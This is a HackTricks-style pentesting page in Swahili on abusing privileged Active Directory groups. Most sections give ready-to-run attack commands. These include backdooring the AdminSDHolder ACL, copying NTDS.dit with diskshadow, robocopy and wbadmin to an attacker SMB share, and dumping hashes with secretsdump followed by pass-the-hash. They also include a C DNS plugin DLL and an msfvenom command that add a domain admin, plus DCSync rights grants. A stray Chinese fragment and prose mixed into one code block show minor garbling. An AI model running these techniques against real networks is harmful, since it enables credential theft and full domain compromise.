# Vikundi Vyenye Privileges

{{#include ../../banners/hacktricks-training.md}}

## Vikundi Vinavyojulikana vyenye privileges za usimamizi

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## Account Operators

Kikundi hiki kina uwezo wa kuunda akaunti na vikundi ambavyo si administrators kwenye domain. Pia, kinawezesha kuingia kwenye Domain Controller (DC) kwa kutumia akaunti ya ndani.

Ili kubaini washiriki wa kikundi hiki, amri ifuatayo hutekelezwa:
```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
Kuongeza users wapya kunaruhusiwa, pamoja na local login kwenye DC.<sup>[[1]](#references)</sup>

## AdminSDHolder group

Access Control List (ACL) ya **AdminSDHolder** group ni muhimu kwa kuwa huweka permissions kwa "protected groups" zote ndani ya Active Directory, ikijumuisha high-privilege groups. Utaratibu huu huhakikisha usalama wa groups hizi kwa kuzuia marekebisho yasiyoidhinishwa.

Attacker anaweza kutumia udhaifu huu kwa kurekebisha ACL ya **AdminSDHolder** group na kumpa standard user permissions kamili. Hii ingempa user huyo control kamili juu ya protected groups zote. Ikiwa permissions za user huyo zitabadilishwa au kuondolewa, zitarejeshwa automatically ndani ya saa moja kutokana na muundo wa mfumo.<sup>[[14]](#references)</sup>

Nyaraka za hivi karibuni za Windows Server bado zinachukulia operator groups kadhaa zilizojengwa ndani kama objects **protected** (`Account Operators`, `Backup Operators`, `Print Operators`, `Server Operators`, `Domain Admins`, `Enterprise Admins`, `Key Admins`, `Enterprise Key Admins`, n.k.). Mchakato wa **SDProp** huendeshwa kwenye **PDC Emulator** kila baada ya dakika 60 kwa default, huweka `adminCount=1`, na huzima inheritance kwenye protected objects. Hii ni muhimu kwa persistence na pia kwa kutafuta privileged users waliopitwa na wakati ambao waliondolewa kwenye protected group lakini bado wanaendelea kuhifadhi ACL isiyoruhusu inheritance.<sup>[[12]](#references)</sup>

Commands za kukagua members na kurekebisha permissions ni pamoja na:
```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```

```powershell
# Hunt users/groups that still have adminCount=1
Get-ADObject -LDAPFilter '(adminCount=1)' -Properties adminCount,distinguishedName |
Select-Object distinguishedName
```
Script inapatikana ili kuharakisha mchakato wa urejeshaji: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

Kwa maelezo zaidi, tembelea [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).<sup>[[14]](#references)</sup>

## AD Recycle Bin

Uanachama katika kundi hili unaruhusu kusoma objects za Active Directory zilizofutwa, jambo linaloweza kufichua taarifa nyeti:
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
Hii ni muhimu kwa **kurejesha njia za awali za privilege**. Objects zilizofutwa bado zinaweza kufichua `lastKnownParent`, `memberOf`, `sIDHistory`, `adminCount`, SPNs za zamani, au DN ya privileged group iliyofutwa ambayo baadaye inaweza kurejeshwa na operator mwingine.
```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects `
-Properties samAccountName,lastKnownParent,memberOf,sIDHistory,adminCount,servicePrincipalName |
Select-Object samAccountName,lastKnownParent,adminCount,sIDHistory,servicePrincipalName
```
### Ufikiaji wa Domain Controller

Ufikiaji wa mafaili kwenye DC umezuiwa isipokuwa mtumiaji awe sehemu ya group la `Server Operators`, hali inayobadilisha kiwango cha ufikiaji.

### Privilege Escalation

Kwa kutumia `PsService` au `sc` kutoka Sysinternals, mtu anaweza kukagua na kurekebisha permissions za services. Group la `Server Operators`, kwa mfano, lina full control juu ya services fulani, hivyo kuruhusu utekelezaji wa commands kiholela na privilege escalation:<sup>[[1]](#references)</sup>
```cmd
C:\> .\PsService.exe security AppReadiness
```
Amri hii inafichua kuwa `Server Operators` wana ufikiaji kamili, hivyo kuwezesha udhibiti wa services kwa ajili ya kupata privileges zilizoinuliwa.

## Backup Operators

Uanachama katika kundi la `Backup Operators` hutoa ufikiaji wa mfumo wa faili wa `DC01` kutokana na privileges za `SeBackup` na `SeRestore`. Privileges hizi huwezesha kupitia folda, kuorodhesha, na kunakili mafaili, hata bila permissions zilizoainishwa wazi, kwa kutumia flag ya `FILE_FLAG_BACKUP_SEMANTICS`. Kutumia scripts maalum ni muhimu kwa mchakato huu.<sup>[[1]](#references)</sup>

Ili kuorodhesha wanachama wa kundi, tekeleza:
```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### Shambulio la Ndani

Ili kutumia privileges hizi locally, hatua zifuatazo hutumika:

1. Import libraries zinazohitajika:
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. Washa na uthibitishe `SeBackupPrivilege`:
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. Fikia na nakili faili kutoka kwenye saraka zilizozuiwa, kwa mfano:
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### AD Attack

Ufikiaji wa moja kwa moja wa mfumo wa faili wa Domain Controller huruhusu kuiba database ya `NTDS.dit`, ambayo ina NTLM hashes zote za users na computers wa domain.

#### Kutumia diskshadow.exe

1. Unda shadow copy ya drive ya `C`:
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. Nakili `NTDS.dit` kutoka kwenye shadow copy:
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
Vinginevyo, tumia `robocopy` kwa kunakili faili:
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. Toa `SYSTEM` na `SAM` kwa ajili ya kupata hash:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. Pata heshi zote kutoka `NTDS.dit`:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
5. Baada ya extraction: Pass-the-Hash to DA<sup>[[11]](#references)</sup>
```bash
# Use the recovered Administrator NT hash to authenticate without the cleartext password
netexec winrm <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"

# Or execute via SMB using an exec method
netexec smb <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```
#### Kutumia wbadmin.exe

1. Sanidi mfumo wa faili wa NTFS kwa seva ya SMB kwenye mashine ya mshambuliaji na uhifadhi credentials za SMB kwenye cache ya mashine lengwa.
2. Tumia `wbadmin.exe` kwa system backup na uchanganuzi wa `NTDS.dit`:
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

Kwa onyesho la vitendo, tazama [VIDEO YA ONYESHO PAMOJA NA IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

Wanachama wa kundi la **DnsAdmins** wanaweza kutumia vibaya privileges zao kupakia DLL ya kiholela yenye privileges za SYSTEM kwenye DNS server, ambayo mara nyingi huwekwa kwenye Domain Controllers. Uwezo huu unawezesha exploitation kubwa.

Ili kuorodhesha wanachama wa kundi la DnsAdmins, tumia:
```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### Tekeleza DLL kiholela (CVE‑2021‑40469)

> [!NOTE]
> Udhaifu huu huruhusu utekelezaji wa code kiholela kwa SYSTEM privileges katika DNS service (kwa kawaida ndani ya DCs). Tatizo hili lilirekebishwa mwaka wa 2021.

Members wanaweza kufanya DNS server ipakie DLL kiholela (iwe ndani ya mfumo au kutoka remote share) kwa kutumia commands kama vile:
```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:

# If dnscmd is not installed run from aprivileged PowerShell session:
Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
Kuanzisha upya huduma ya DNS (ambako kunaweza kuhitaji ruhusa za ziada) ni muhimu ili DLL ipakizwe:
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
Kwa maelezo zaidi kuhusu attack vector hii, rejelea ired.team.

#### Mimilib.dll

Pia inawezekana kutumia mimilib.dll kwa command execution, kwa kuirekebisha ili itekeleze commands maalum au reverse shells. [Angalia chapisho hili](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) kwa maelezo zaidi.<sup>[[15]](#references)</sup>

### Rekodi ya WPAD kwa MitM

DnsAdmins wanaweza kudhibiti DNS records ili kufanya mashambulizi ya Man-in-the-Middle (MitM), kwa kuunda rekodi ya WPAD baada ya kuzima global query block list. Zana kama Responder au Inveigh zinaweza kutumika kufanya spoofing na kunasa network traffic.

### Wasomaji wa Event Log
Wanachama wanaweza kufikia event logs, na hivyo uwezekano wa kupata taarifa nyeti kama vile plaintext passwords au maelezo ya command execution:
```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Exchange Windows Permissions

Kundi hili linaweza kurekebisha DACLs kwenye object ya domain, na huenda likatoa privileges za DCSync. Techniques za privilege escalation zinazotumia kundi hili zimeelezwa katika GitHub repo ya Exchange-AD-Privesc.
```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
Ikiwa unaweza kutenda kama mwanachama wa kundi hili, unyonyaji wa kawaida ni kumpa principal anayedhibitiwa na mshambuliaji haki za replication zinazohitajika kwa [DCSync](dcsync.md):
```bash
Add-DomainObjectAcl -TargetIdentity "DC=testlab,DC=local" -PrincipalIdentity attacker -Rights DCSync
Get-ObjectAcl -DistinguishedName "DC=testlab,DC=local" -ResolveGUIDs | ?{$_.IdentityReference -match 'attacker'}
```
Kihistoria, **PrivExchange** iliunganisha ufikiaji wa mailbox, authentication ya Exchange iliyolazimishwa, na LDAP relay ili kufikia primitive hii hii. Hata pale ambapo njia hiyo ya relay imezuiwa, uanachama wa moja kwa moja katika `Exchange Windows Permissions` au udhibiti wa Exchange server bado ni njia yenye thamani kubwa ya kupata haki za domain replication.

## Hyper-V Administrators

Hyper-V Administrators wana ufikiaji kamili wa Hyper-V, ambao unaweza kutumiwa kupata udhibiti wa Domain Controllers zilizovirtualize. Hii inajumuisha ku-clone DC zinazoendelea kufanya kazi na kutoa NTLM hashes kutoka kwenye faili la NTDS.dit.

### Mfano wa Exploitation

Abuse ya kiutendaji kwa kawaida huwa **ufikiaji wa offline kwenye disks/checkpoints za DC** badala ya mbinu za zamani za host-level LPE. Akiwa na ufikiaji wa Hyper-V host, operator anaweza kuunda checkpoint au ku-export Domain Controller iliyovirtualize, ku-mount VHDX, na kutoa `NTDS.dit`, `SYSTEM`, pamoja na secrets nyingine bila kugusa LSASS ndani ya guest:
```bash
# Host-side enumeration
Get-VM
Get-VHD -VMId <vm-guid>

# After exporting or checkpointing the DC, mount the disk read-only
Mount-VHD -Path 'C:\HyperV\Virtual Hard Disks\DC01.vhdx' -ReadOnly
```
Kutoka hapo, tumia tena workflow ya `Backup Operators` kunakili `Windows\NTDS\ntds.dit` na registry hives ukiwa offline. Workflow inayohusiana ya backup-file:

{{#ref}}
../../network-services-pentesting/pentesting-veeam-backup-and-replication.md
{{#endref}}

## Group Policy Creators Owners

Kikundi hiki huruhusu wanachama kuunda Group Policies katika domain. Hata hivyo, wanachama wake hawawezi kutumia group policies kwa users au groups, wala kuhariri GPOs zilizopo.

Jambo muhimu ni kwamba **creator anakuwa owner wa GPO mpya** na kwa kawaida hupata rights za kutosha kuihariri baadaye. Hii inamaanisha kuwa kikundi hiki kinavutia pale unapoweza:

- kuunda GPO hasidi na kumshawishi admin kui-link kwenye target OU/domain
- kuhariri GPO uliyoiunda ambayo tayari ime-linkiwa mahali panapofaa
- kutumia vibaya delegated right nyingine inayokuruhusu ku-link GPOs, huku kikundi hiki kikikupa upande wa kuhariri

Abuse ya kawaida kwa vitendo humaanisha kuongeza **Immediate Task**, **startup script**, **local admin membership**, au mabadiliko ya **user rights assignment** kupitia policy files zinazotegemea SYSVOL.<sup>[[3]](#references)[[4]](#references)[[13]](#references)[[16]](#references)</sup>
```bash
# Example with SharpGPOAbuse: add an immediate task that executes as SYSTEM
SharpGPOAbuse.exe --AddImmediateTask --TaskName "HT-Task" --Author TESTLAB\\Administrator --Command "cmd.exe" --Arguments "/c whoami > C:\\Windows\\Temp\\gpo.txt" --GPOName "Security Update"
```
Ikiwa unahariri GPO wewe mwenyewe kupitia `SYSVOL`, kumbuka kuwa mabadiliko hayo hayatoshi peke yake: `versionNumber`, `GPT.ini`, na wakati mwingine `gPCMachineExtensionNames` lazima pia zisasishwe, la sivyo clients zitapuuza policy refresh.<sup>[[9]](#references)</sup>

## Organization Management

Katika mazingira ambamo **Microsoft Exchange** imesakinishwa, kuna group maalum inayojulikana kama **Organization Management** yenye uwezo mkubwa. Group hii ina privileged ya **kufikia mailboxes za watumiaji wote wa domain** na ina **full control juu ya** Organizational Unit (OU) ya **'Microsoft Exchange Security Groups'**. Udhibiti huu unajumuisha group ya **`Exchange Windows Permissions`**, ambayo inaweza kutumiwa kwa privilege escalation.

### Privilege Exploitation and Commands

#### Print Operators

Wanachama wa group ya **Print Operators** wamepewa privileges kadhaa, ikiwa ni pamoja na **`SeLoadDriverPrivilege`**, inayowaruhusu **kuingia locally kwenye Domain Controller**, kuizima, na kusimamia printers. Ili kutumia privileges hizi, hasa ikiwa **`SeLoadDriverPrivilege`** haionekani katika context isiyo elevated, ni muhimu kupita User Account Control (UAC).<sup>[[1]](#references)</sup>

Ili kuorodhesha wanachama wa group hii, command ifuatayo ya PowerShell hutumiwa:
```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
Kwenye Domain Controllers, group hili ni hatari kwa sababu default Domain Controller Policy huwapa **`SeLoadDriverPrivilege`** washiriki wa `Print Operators`. Ukipata elevated token ya mshiriki wa group hili, unaweza kuwezesha privilege hiyo na kupakia signed-but-vulnerable driver ili kupata ufikiaji wa kernel/SYSTEM.<sup>[[2]](#references)[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[10]](#references)[[17]](#references)</sup> Kwa maelezo ya token handling, angalia [Access Tokens](../windows-local-privilege-escalation/access-tokens.md).

#### Remote Desktop Users

Washiriki wa group hili hupewa ufikiaji wa PCs kupitia Remote Desktop Protocol (RDP). Ili ku-enumerate washiriki hawa, PowerShell commands zinapatikana:
```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
Maarifa zaidi kuhusu exploiting RDP yanaweza kupatikana katika rasilimali maalum za pentesting.

#### Remote Management Users

Wanachama wanaweza kufikia PC kupitia **Windows Remote Management (WinRM)**. Uorodheshaji wa wanachama hawa hufanywa kupitia:
```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
Kwa mbinu za exploitation zinazohusiana na **WinRM**, nyaraka maalum zinapaswa kushauriwa.

#### Server Operators

Kikundi hiki kina ruhusa za kufanya usanidi mbalimbali kwenye Domain Controllers, ikiwemo haki za kuhifadhi nakala na kurejesha, kubadilisha muda wa mfumo, na kuzima mfumo.<sup>[[1]](#references)</sup> Ili kuorodhesha wanachama, command iliyotolewa ni:
```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
Kwenye Domain Controllers, `Server Operators` kwa kawaida hurithi rights za kutosha za **kusanidi upya au kuanzisha/kusimamisha services** na pia hupokea `SeBackupPrivilege`/`SeRestorePrivilege` kupitia default DC policy. Kwa vitendo, hii huwafanya kuwa daraja kati ya **service-control abuse** na **NTDS extraction**:
```cmd
sc.exe \\dc01 query
sc.exe \\dc01 qc <service>
.\PsService.exe security <service>
```
Ikiwa service ACL inaupa group hii ruhusa za kubadilisha/kus启动, elekeza service kwenye command yoyote, ianzishe kama `LocalSystem`, kisha urejeshe `binPath` ya awali. Ikiwa service control imefungwa, tumia fallback ya mbinu za `Backup Operators` zilizo hapo juu kunakili `NTDS.dit`.

## References

- [1] [ired.team – Akaunti Zenye Privilege na Token Privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [2] [Tarlogic – Kutumia Vibaya SeLoadDriverPrivilege kwa Privilege Escalation](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [3] [harmj0y – Kutumia Vibaya Ruhusa za GPO](https://blog.harmj0y.net/redteaming/abusing-gpo-permissions/)
- [4] [rastamouse – GPO Abuse, Sehemu ya 1 (Internet Archive)](https://web.archive.org/web/20190416075109/https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [5] [killswitch-GUI – HotLoad-Driver (ntloaddriver.cpp)](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [6] [tandasat – ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [7] [TarlogicSecurity – EoPLoadDriver (eoploaddriver.cpp)](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [8] [FuzzySecurity – Capcom-Rootkit (Capcom.sys)](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [9] [SpecterOps – Mwongozo wa Red Teamer kwa GPO na OU](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [10] [Microsoft Learn – Function ya ZwLoadDriver](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwloaddriver)
- [11] [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)
- [12] [Microsoft Learn – Kiambatisho C: Akaunti na Groups Zilizo Protected katika Active Directory](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory)
- [13] [WithSecure Labs – SharpGPOAbuse](https://labs.withsecure.com/tools/sharpgpoabuse)
- [14] [ired.team – Jinsi ya Kutumia Vibaya na Kufanya Backdoor ya AdminSDHolder ili Kupata Domain Admin Persistence](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)
- [15] [Lab of a Penetration Tester – Kutumia Vibaya DnsAdmins Privilege kwa Escalation katika Active Directory](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)
- [16] [BloodHound – Maelezo ya kutumia vibaya GenericAll edge](https://bloodhound.specterops.io/resources/edges/generic-all)
- [17] [Undocumented NT Internals – Function ya NtLoadDriver (Internet Archive)](https://web.archive.org/web/20200313000124/http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
{{#include ../../banners/hacktricks-training.md}}
